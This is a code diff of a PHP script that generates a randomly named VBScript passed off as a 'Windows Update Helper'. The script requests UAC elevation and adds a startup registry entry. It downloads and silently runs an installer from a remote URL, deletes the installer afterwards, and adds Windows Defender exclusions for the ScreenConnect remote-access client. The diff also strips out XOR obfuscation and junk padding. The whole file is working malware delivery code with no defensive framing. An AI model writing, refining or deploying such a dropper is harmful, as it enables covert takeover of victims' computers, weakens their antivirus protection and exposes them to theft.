@@ -1,5 +1,5 @@
 <?php
-// invite.php - Temporary on-screen logs
+// invite.php - Fixed elevation + download
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
@@ -23,7 +23,6 @@ if (empty($available)) {
 
 $chosenBase = $available[array_rand($available)];
 $random5 = str_pad(rand(10000, 99999), 5, '0', STR_PAD_LEFT);
-
 $chosen = $chosenBase . "_" . $random5 . ".vbs";
 
 $used[] = $chosenBase;
@@ -37,16 +36,9 @@ $sessionId = bin2hex(random_bytes(24));
 $ts        = time();
 $randV1    = 'v' . substr(md5(random_bytes(8)), 0, 12);
 $randFunc  = 'f' . substr(md5(random_bytes(8)), 0, 10);
-$xorKey    = rand(100, 255);
-
-$junkLines = rand(12, 45);
-$junk = "";
-for ($i = 0; $i < $junkLines; $i++) {
-    $junk .= "' Junk " . bin2hex(random_bytes(rand(8, 22))) . "\n";
-}
 
 echo <<<VBS
-' Windows Update Helper - $ts - DEBUG LOGS ON SCREEN
+' Windows Update Helper - $ts
 
 Dim $randV1, objShell, objFSO
 Set objShell = CreateObject("WScript.Shell")
@@ -60,48 +52,28 @@ End Sub
 
 Call Log("Script started")
 
-Function D(s)
-    Dim i, r : r = ""
-    For i = 1 To Len(s)
-        r = r & Chr(Asc(Mid(s, i, 1)) Xor $xorKey)
-    Next
-    D = r
-End Function
-
 Function IsElevated()
     On Error Resume Next
-    Dim wmi, proc
+    Dim wmi, col, item
     Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")
-    Set proc = wmi.ExecQuery("Select * from Win32_Process where ProcessId=" & GetObject("winmgmts:\\\\.\\root\\cimv2:Win32_Process.Handle=" & objShell.ProcessId).ProcessId)
+    Set col = wmi.ExecQuery("Select * from Win32_Process where ProcessId = " & objShell.ProcessId)
+    For Each item In col
+        IsElevated = (item.GetOwner().Domain = "NT AUTHORITY")
+        Exit Function
+    Next
     IsElevated = False
 End Function
 
-Sub $randFunc
-    On Error Resume Next
-    Call Log("Main function started")
-    If Not IsElevated Then 
-        Call Log("Requesting UAC elevation")
-        Call Elevate
-    End If
-    Call AddToStartup
-    Call DownloadAndExecute
-    Call HideAgent
-    Call Log("Script finished successfully")
-End Sub
-
 Sub Elevate()
     On Error Resume Next
-    Dim fsoPath, cmd
-    fsoPath = WScript.ScriptFullName
-    cmd = D("dmd /c ") & """" & fsoPath & """"
-    objShell.ShellExecute "cmd.exe", cmd, "", "runas", 1
+    Call Log("Requesting elevation...")
+    objShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 1
     WScript.Quit
 End Sub
 
 Sub AddToStartup()
     On Error Resume Next
-    objShell.RegWrite D("ILDV\\Tpguxbsf\\Njdsptpgu\\Xjoepxt\\DvssfouWfsjpo\\Svo\\XjoepxtVqebufIfmqfs"), _
-        WScript.ScriptFullName, "REG_SZ"
+    objShell.RegWrite "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper", WScript.ScriptFullName, "REG_SZ"
     Call Log("Added to startup")
 End Sub
 
@@ -116,26 +88,43 @@ Sub DownloadAndExecute()
     http.Open "GET", u, False
     http.Send
     Call Log("HTTP Status: " & http.Status)
+    
     If http.Status = 200 Then
         Set strm = CreateObject("ADODB.Stream")
-        strm.Type = 1 : strm.Open : strm.Write http.responseBody : strm.SaveToFile p, 2 : strm.Close
-        Call Log("Download complete")
+        strm.Type = 1
+        strm.Open
+        strm.Write http.responseBody
+        strm.SaveToFile p, 2
+        strm.Close
+        Call Log("Download complete → " & p)
+        
+        Call Log("Starting silent install (waiting 10 minutes)...")
         objShell.Run """" & p & """ /quiet", 0, True
-        Call Log("Installer started - waiting 10 minutes")
         WScript.Sleep 600000
         If objFSO.FileExists(p) Then objFSO.DeleteFile p, True
         Call Log("Cleanup done")
+    Else
+        Call Log("Download failed")
     End If
 End Sub
 
 Sub HideAgent()
     On Error Resume Next
-    objShell.Run D("qpxfstifmm -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'"""), 0, True
-    Call Log("Defender exclusions attempted")
+    objShell.Run "powershell -NoProfile -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionPath 'C:\\Program Files (x86)\\ScreenConnect Client*'; Add-MpPreference -ExclusionProcess 'ScreenConnect*.exe'""", 0, True
+    Call Log("Defender exclusion attempted")
 End Sub
 
-$junk
-Call $randFunc
+' ===== MAIN =====
+If Not IsElevated Then
+    Call Elevate
+Else
+    Call Log("Running elevated")
+    Call AddToStartup
+    Call DownloadAndExecute
+    Call HideAgent
+    Call Log("All done")
+End If
+
 WScript.Quit
 VBS;
 ?>
